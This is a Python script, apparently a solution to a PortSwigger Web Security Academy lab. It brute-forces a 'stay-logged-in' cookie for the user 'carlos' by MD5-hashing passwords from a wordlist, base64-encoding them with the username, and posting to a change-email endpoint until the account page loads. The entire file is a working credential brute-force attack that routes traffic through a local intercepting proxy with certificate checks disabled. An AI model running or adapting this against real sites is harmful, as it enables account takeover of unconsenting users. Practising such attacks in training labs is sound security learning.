import requests
import hashlib
import base64

#Below function can be used to convert string to md5 
# a= "peter"
# result = hashlib.md5(a.encode("utf-8")).hexdigest()
# print(result)

# result1 = "wiener:"+result
# print(result1)

#below function can be used to convert string to base64 encoded
# message_bytes = result1.encode('ascii')
# base64_bytes = base64.b64encode(message_bytes)
# base64_message = base64_bytes.decode('ascii')

# print(base64_message)

#to disable ceritifcate warning
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

app_url = "https://0ac700660402125a82b879ba009e0041.web-security-academy.net/my-account/change-email"     #application url
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} 
data = {"email":"ron@ron.com"}

with open('passwords.txt','r') as file:
    for line in file:
        passw = line.strip()
        passwmd = hashlib.md5(passw.encode("utf-8")).hexdigest()
        passu = "carlos:" + passwmd
        message_bytes = passu.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print("Checking for password",passw,"with md5 hash",base64_message)
        cookies = {'stay-logged-in':base64_message}
        r = requests.post(app_url,verify=False, proxies=proxies,data=data,cookies=cookies)
        if "Your username is:" in r.text:
            print("password found", passw)
            break

